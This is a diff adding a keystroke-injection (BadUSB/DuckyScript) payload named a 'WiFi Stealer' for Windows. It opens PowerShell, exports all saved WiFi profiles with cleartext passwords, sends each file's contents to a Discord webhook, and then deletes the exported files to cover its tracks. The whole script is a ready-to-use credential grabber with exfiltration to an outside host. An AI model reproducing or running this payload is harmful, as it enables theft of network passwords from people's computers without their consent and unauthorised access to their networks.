@@ -1,0 +1,58 @@
+REM Title: Doggo WiFi Stealer Using Discord Webhook
+REM Author: MHooijberg
+REM Version: 1.0
+REM Target:  Windows 7/8/10/11 
+REM Category: Grabber
+REM Inspiration: https://github.com/UberGuidoZ/Flipper/blob/main/BadUSB/Wifi-Stealer_Discord.txt
+REM Description: Extracts the SSID and wifi shared keys to xml files and send it to discord webhook.
+REM Runtime: (468 * N) + ((220 * N + 500ms) * (# Of WiFi Networks)). Where N is the input duration of each character
+GUI r
+DELAY 500
+ALTSTRING powershell
+ENTER
+DELAY 2000
+REM Save the Discord Webhook Endpoint in an variable.
+ALTSTRING $webhookUri = 'https://discord.com/api/webhooks/<your_webhook_info>'
+ENTER
+REM Creating a new folder in Temp with random name to store the xml files.
+ALTSTRING New-Item -Path $env:temp -Name "476F6F6420426F7921" -ItemType "directory"
+ENTER
+REM Set the currend working directory to the temporary local appdata folder.
+ALTSTRING Set-Location -Path "$env:temp/476F6F6420426F7921"
+ENTER
+REM Export all WiFi credentials.
+ALTSTRING netsh wlan export profile key=clear;
+ENTER
+REM Change the directory path so that the exported files can be deleted later.
+ALTSTRING Set-Location -Path $env:temp
+ENTER
+REM Get all child files
+ALTSTRING Get-ChildItem "$env:tmp/476F6F6420426F7921" -File |
+ENTER
+ALTSTRING ForEach-Object {
+ENTER
+REM Get the file content from the newly created file on the desktop.
+ALTSTRING $fileContent = Get-Content $_.FullName | Out-String
+ENTER
+REM Create a body for the endpoint request.
+ALTSTRING $Body = @{
+ENTER
+ALTSTRING 'username' = '{Type:"Doggo", Nametag:"Haxor"}'
+ENTER
+ALTSTRING 'content' = '```xml'  + "`n" + $fileContent + '```'
+ENTER
+ALTSTRING }
+ENTER
+REM Send a post request to the Uri with the specified body.
+ALTSTRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+ENTER
+REM Wait for 0.3 seconds.
+STRING Start-Sleep -Milliseconds 300
+ALTSTRING }
+ENTER
+REM Remove all exported WiFi files.
+ALTSTRING Remove-Item -Path "$env:tmp/476F6F6420426F7921" -Force -Recurse
+ENTER
+REM Exit powershell.
+ALTSTRING exit
+ENTER
